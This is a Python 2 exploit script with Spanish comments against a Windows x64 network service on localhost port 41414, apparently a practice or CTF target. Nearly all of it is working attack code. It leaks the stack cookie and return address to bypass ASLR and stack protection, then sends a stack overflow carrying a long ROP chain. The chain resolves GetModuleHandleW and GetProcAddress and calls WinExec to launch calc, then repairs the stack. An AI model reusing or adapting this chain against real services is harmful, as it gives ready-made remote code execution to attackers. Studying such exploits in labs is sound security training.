import socket
import time
import struct
import select
import string
import random, string
import binascii

def randomword(length):
   letters = string.ascii_lowercase
   return ''.join(random.choice(letters) for i in range(length))


def my_print(name, string):
    a= binascii.hexlify(string)
    b="\\x" +"\\x".join([a[i:i+2] for i in range(0, len(a), 2)])
    print name + ": " + b


HOST="127.0.0.1"
PUERTO=41414

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((HOST,PUERTO))

#-----------------------------------------------------------

payload="Hello"

s.send(payload)

time.sleep(1)

#-----------------------------------------------------------

datos=s.recv(1024)

print datos

polenta="\x00\x02\x00\x00"
polenta+="\x22\x22\x22\x22"
polenta+="\x00\x02\x00\x00"
polenta+="\xd0\xff\xff\xff"

s.send(polenta)

time.sleep(1)

#-----------------------------------------------------------


polenta= 30 * "A" + struct.pack("<I",0x000002ff) + (0x200 -34) *"A"

print polenta

s.send(polenta)

data = s.recv(1024)

cookie_raw=data[512:512+8]

#my_print("COOKIE", cookie_raw)

ret_addr=cookie=data[536:536+8]

#my_print("RETURN_ADDRESS", ret_addr)

#------------------------------------------------------

cookie= struct.unpack("<Q", cookie_raw)[0]
dir_volver_fix =struct.unpack("<Q", ret_addr)[0]
base_exe= struct.unpack("<Q", ret_addr)[0] - 0x1d31
dir_flag= base_exe + 0xd090
dir_kernel32 = base_exe + 0xd4bb #13F86D4BB
dir_system=base_exe +0xd4ee
dir_calc=base_exe+0xd500
dir_import_data = base_exe + 0xA000

cerrar_conexion=struct.unpack('<Q',data[544:552])[0]
dir_stack=struct.unpack('<Q',data[560:568])[0]


dir_sock=struct.unpack('<Q',data[592:600])[0]
dir_addr=struct.unpack('<q',data[616:624])[0]

dir_modulo=base_exe + 0x1000
dir_disable=dir_flag

print "[*]Cookie:%x" % cookie
print "[*]Dir_bf:%x "% dir_modulo
print "[*]Dir_Disable:%x" % dir_disable
print "[*]Dir_unicode_kernel32:%x" % dir_kernel32
print "[*]Dir_Import_Data:%x" % dir_import_data
print "[*]Dir_stack:%x" % dir_stack
print "[*]Socket_cerrar:%x" % cerrar_conexion
print "[*]Socket: %x" % dir_sock
print "[*]Addr:%x"%dir_addr
print "[*]dir_volver_fix:%x "% dir_volver_fix

#-------Pwn--------------------------------------------------



s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((HOST,PUERTO))

payload="Hello"


s.send(payload)

time.sleep(1)



datos=s.recv(1024)

print datos



polenta=struct.pack('<I',0x00001660)
polenta+=struct.pack('<I',0xCAFECAFE)
polenta+="\x00\x00\x00\x00"
polenta+="\xd0\xff\xff\xff"


s.send(polenta)



pwn="A"*16
pwn+="BBBBBBBB"*2
pwn+="A"*(512-len(pwn))
pwn+=struct.pack('<Q',cookie)
pwn+=struct.pack('<I',0x00000220)
pwn+=struct.pack('<I',0xCAFECAFE)
pwn+=struct.pack('<I',0x00000000)
pwn+=struct.pack('<I',0xFFFFFFd0)

#------------Rop-------------------------------


pwn+=struct.pack('<Q',dir_modulo+0xEBB)#RIP #000000013F861EBB xor eax, eax # retn
pwn+=struct.pack('<Q',dir_modulo+0x12C1)#000000013F8622C1 pop rbx # retn
pwn+=struct.pack('<Q',dir_disable)
pwn+=struct.pack('<Q',dir_modulo+0x4F25)#000000013F865F25 mov [rbx], eax # add rsp, 20h # pop rbx # retn

pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno
pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno
pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno
pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno

pwn+=struct.pack('<Q',dir_kernel32)# pop rbx





pwn+=struct.pack('<Q',dir_modulo+0x14b)#000000013F86114B pop rax # retn
pwn+="\x6b\x00\x65\x00\x6b\x00\x65\x00" # ke

pwn+=struct.pack('<Q',dir_modulo+0x4F25)#000000013F865F25 mov [rbx], eax # add rsp, 20h # pop rbx # retn


pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno
pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno
pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno
pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno

pwn+=struct.pack('<Q',dir_kernel32+4)# pop rbx

pwn+=struct.pack('<Q',dir_modulo+0x14b)#000000013F86114B pop rax # retn
pwn+="\x72\x00\x6e\x00\x72\x00\x6e\x00" # rn

pwn+=struct.pack('<Q',dir_modulo+0x4F25)#000000013F865F25 mov [rbx], eax # add rsp, 20h # pop rbx # retn


pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno
pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno
pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno
pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno


pwn+=struct.pack('<Q',dir_kernel32+8)# pop rbx

pwn+=struct.pack('<Q',dir_modulo+0x14b)#000000013F86114B pop rax # retn
pwn+="\x65\x00\x6c\x00\x65\x00\x6c\x00" # el

pwn+=struct.pack('<Q',dir_modulo+0x4F25)#000000013F865F25 mov [rbx], eax # add rsp, 20h # pop rbx # retn


pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno
pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno
pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno
pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno

pwn+=struct.pack('<Q',dir_kernel32+12)# pop rbx

pwn+=struct.pack('<Q',dir_modulo+0x14b)#000000013F86114B pop rax # retn
pwn+="\x33\x00\x32\x00\x33\x00\x32\x00" # 32

pwn+=struct.pack('<Q',dir_modulo+0x4F25)#000000013F865F25 mov [rbx], eax # add rsp, 20h # pop rbx # retn

pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno
pwn+=struct.pack('<Q',dir_kernel32)# Relleno -> RCX Handle!!

pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno
pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno
pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno







pwn+=struct.pack('<Q',dir_modulo+0x14b)#000000013F86114B pop rax # retn
pwn+="\xfe\xca\xfe\xca\xfe\xca\xfe\xca" # el



#Write system!
pwn+=struct.pack('<Q',dir_modulo+0x12C1)#000000013F8622C1 pop rbx # retn
pwn+=struct.pack('<Q',dir_system)

pwn+=struct.pack('<Q',dir_modulo+0x14b)#000000013F86114B pop rax # retn
pwn+="WinEWinE" # wine

pwn+=struct.pack('<Q',dir_modulo+0x4F25)#000000013F865F25 mov [rbx], eax # add rsp, 20h # pop rbx # retn

pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno
pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno
pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno
pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno


pwn+=struct.pack('<Q',dir_system+4) # Nuevo write!

pwn+=struct.pack('<Q',dir_modulo+0x14b)#000000013F86114B pop rax # retn
pwn+="\x78\x65\x63\x00\x78\x65\x63\x00" # xec

pwn+=struct.pack('<Q',dir_modulo+0x4F25)#000000013F865F25 mov [rbx], eax # add rsp, 20h # pop rbx # retn


pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno
pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno
pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno
pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno
pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE) # Relleno!


dirGetModuleHandleW=dir_import_data+0x40
dirGetProcAddress=dir_import_data+0x38
dir_WinExec=dir_calc+0x40


#----------Obtengo handle------------------

#Cargo en rcx, kernel32
pwn+=struct.pack('<Q',dir_modulo+0x5e1b)#000000013F866E1B mov rcx, [rsp+48h+var_18] # and dword ptr [rcx+0C8h], 0FFFFFFFDh # add rsp, 40h # pop rbx # retn
pwn+=struct.pack('<Q',dir_kernel32)# Relleno
pwn+=struct.pack('<Q',dir_kernel32)# Relleno
pwn+=struct.pack('<Q',dir_kernel32)# Relleno
pwn+=struct.pack('<Q',dir_kernel32)# Relleno
pwn+=struct.pack('<Q',dir_kernel32)# Relleno
pwn+=struct.pack('<Q',dir_kernel32)
pwn+=struct.pack('<Q',dir_kernel32)# Relleno
pwn+=struct.pack('<Q',dir_kernel32)# Relleno
pwn+=struct.pack('<Q',dir_kernel32)# Relleno


#Call GetModuleHandleW
pwn+=struct.pack('<Q',dir_modulo+0x14b)#000000013F86114B pop rax # retn
pwn+=struct.pack('<Q',dirGetModuleHandleW-0x20c48348)
pwn+=struct.pack('<Q',dir_modulo+0x8B8C)#000000013F689B8C call qword ptr [rax+20C48348h] # pop rbp # retn
pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)#



pwn+=struct.pack('<Q',dir_modulo+0x12C1)#000000013F8622C1 pop rbx # retn
pwn+=struct.pack('<Q',dir_calc)


pwn+=struct.pack('<Q',dir_modulo+0x14b)#000000013F86114B pop rax # retn
pwn+="calccalc" # calc

pwn+=struct.pack('<Q',dir_modulo+0x4F25)#000000013F865F25 mov [rbx], eax # add rsp, 20h # pop rbx # retn


pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno
pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno
pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno
pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno
pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno



#Levanto en RDX WinExec!
pwn+=struct.pack('<Q',dir_modulo+0x14b)#000000013F86114B pop rax # retn
pwn+=struct.pack('<Q',dir_kernel32+0x80)

pwn+=struct.pack('<Q',dir_modulo+0x3cc5)#000000013F294CC5 pop rdx # add [rax],al # cmp [rax], cx # jz short loc_13F294CD0 # xor eax, eax # retn
pwn+=struct.pack('<Q',dir_system)




#Ejecuto GetProcAddress
pwn+=struct.pack('<Q',dir_modulo+0x12C1)#000000013F8622C1 pop rbx # retn
pwn+=struct.pack('<Q',dirGetProcAddress)

pwn+=struct.pack('<Q',dir_modulo+0x3c66)#13F9D4C66 .text 000000013F9D1000 000000013F9DA000 R . X . L para 0001 public CODE 64 0000 0000 0003 FFFFFFFFFFFFFFFF FFFFFFFFFFFFFFFF

pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)
pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)
pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)
pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)

pwn+=struct.pack('<Q',0x0000000000000000)#rdi

#Escribiendo dir WinExec y ejecutando!

pwn+=struct.pack('<Q',dir_modulo+0x12C1)#000000013F8622C1 pop rbx # retn
pwn+=struct.pack('<Q',dir_WinExec) # Nuevo write!

pwn+=struct.pack('<Q',dir_modulo+0x874B)#000000013F0C974B mov [rbx], rax # mov [rbx+10h], rax # mov [rbx+8], eax # add rsp, 20h # pop rbx # retn

pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno
pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno
pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno
pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno
pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)# Relleno


#Levanto dir de calc!

pwn+=struct.pack('<Q',dir_modulo+0x5e1b)#000000013F866E1B mov rcx, [rsp+48h+var_18] # and dword ptr [rcx+0C8h], 0FFFFFFFDh # add rsp, 40h # pop rbx # retn
pwn+=struct.pack('<Q',dir_calc)# Relleno
pwn+=struct.pack('<Q',dir_calc)# Relleno
pwn+=struct.pack('<Q',dir_calc)# Relleno
pwn+=struct.pack('<Q',dir_calc)# Relleno
pwn+=struct.pack('<Q',dir_calc)# Relleno
pwn+=struct.pack('<Q',dir_calc)# Relleno
pwn+=struct.pack('<Q',dir_calc)# Relleno
pwn+=struct.pack('<Q',dir_calc)# Relleno
pwn+=struct.pack('<Q',dir_calc)# Relleno

#Ejecuto!

pwn+=struct.pack('<Q',dir_modulo+0x3c6e)#13FDA4C6E CALL rax # retn

pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)
pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)
pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)
pwn+=struct.pack('<Q',0xCAFECAFECAFECAFE)

pwn+=struct.pack('<Q',0x0000000000000000)#rdi

#fix


pwn+=struct.pack('<Q',dir_volver_fix)
pwn+="\x00"*0x30
pwn+=struct.pack('<Q',dir_sock)
pwn+="\x00"*0x10
pwn+=struct.pack('<Q',dir_addr)
pwn+="\x00"*(0x1070-0x50)
pwn+=struct.pack('<Q',cerrar_conexion)

print "Tam:%x" %len(pwn)

s.send(pwn)
